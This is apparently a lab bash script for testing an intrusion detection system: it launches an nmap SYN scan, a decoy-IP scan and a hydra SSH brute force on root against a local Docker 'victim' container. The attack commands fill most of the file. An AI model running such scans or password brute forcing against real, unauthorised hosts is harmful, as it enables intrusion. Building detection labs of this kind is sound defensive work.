#!/usr/bin/env bash
# Launch attacks from multiple simulated sources
# Usage: bash lab/scripts/run_distributed_attack.sh

set -euo pipefail

VICTIM_IP="$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' ids-victim)"

echo "[+] Launching distributed attacks from multiple sources"
echo "======================================================"

# Attack 1: Direct scan
echo "[*] Attack 1: Direct port scan"
docker exec ids-attacker nmap -sS -p 1-500 "$VICTIM_IP" &
PID1=$!

# Attack 2: Scan with decoy IPs
echo "[*] Attack 2: Decoy scan"
docker exec ids-attacker nmap -sS -D RND:5,ME -p 1-500 "$VICTIM_IP" &
PID2=$!

# Attack 3: SSH brute force in background
echo "[*] Attack 3: SSH brute force"
docker exec ids-attacker hydra -l root -P /opt/wordlist.txt -t 4 "ssh://${VICTIM_IP}" -e n &
PID3=$!

# Wait for all attacks
wait $PID1 $PID2 $PID3

echo "[+] Distributed attacks complete"
